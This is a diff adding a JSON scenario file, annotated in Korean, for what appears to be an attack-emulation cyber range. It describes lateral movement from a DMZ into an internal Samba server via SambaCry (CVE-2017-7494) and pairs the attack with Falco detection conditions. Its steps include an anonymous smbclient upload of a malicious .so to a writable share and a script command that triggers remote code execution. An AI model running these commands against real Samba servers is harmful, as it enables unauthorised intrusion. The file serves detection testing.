@@ -1,0 +1,34 @@
+{
+  "_note": "핵심층 환경 — corp 킬체인 ② DMZ→내부 측면이동. Samba 4.6.3 SambaCry(CVE-2017-7494). 쓰기 가능 게스트 공유에 악성 .so 업로드 → 서버가 로드 시 실행. 조건 문법은 postgres.json(canonical) 참고. 진행도 선저작.",
+  "env": "corp-samba-sambacry",
+  "technique": "T1210",
+  "cve": "CVE-2017-7494",
+  "procedure": {
+    "id": "PROC-corp-samba-sambacry",
+    "name": "SambaCry 쓰기공유 .so 로드 RCE",
+    "description": "DMZ 에서 확보한 셸로 내부 존 samba(samba.corp-internal.svc.cluster.local:445)의 쓰기 가능 게스트 공유에 악성 공유 라이브러리(.so)를 업로드하고, named pipe 경로로 그 .so 를 로드시켜 smbd 프로세스 컨텍스트에서 코드를 실행한다(metasploit is_known_pipename 또는 수동 업로드).",
+    "status": "AUTHORED",
+    "steps": [
+      {"id": "STEP-corp-samba-upload", "seq": 1,
+       "command": "smbclient //samba.corp-internal.svc.cluster.local/public -N -c 'put payload.so'",
+       "description": "쓰기 가능 게스트 공유에 악성 .so 업로드"},
+      {"id": "STEP-corp-samba-load", "seq": 2,
+       "command": "python3 sambacry.py --target samba.corp-internal.svc.cluster.local --share public --so payload.so",
+       "description": "named pipe 로 .so 로드 트리거 → smbd 컨텍스트 RCE(CVE-2017-7494)"}
+    ]
+  },
+  "preconditions": [
+    {"id": "PRE-corp-samba-writable",
+     "name": "쓰기 가능 게스트 공유 + 내부 도달",
+     "description": "DMZ 피벗으로 corp-internal samba(:445)에 도달 가능하고, 인증 없는 쓰기 공유가 열려 있어 .so 업로드·로드가 가능."}
+  ],
+  "expected_results": [
+    {"id": "ER-corp-samba-progress",
+     "name": "내부 측면이동 RCE 흔적 (진행도)",
+     "kind": "progress",
+     "outcome": {"id": "AO-lateral-movement", "name": "측면이동(내부 RCE)"},
+     "conditions": [
+       {"channel": "falco", "field": "technique", "operator": "eq", "expected": "T1210"}
+     ]}
+  ]
+}
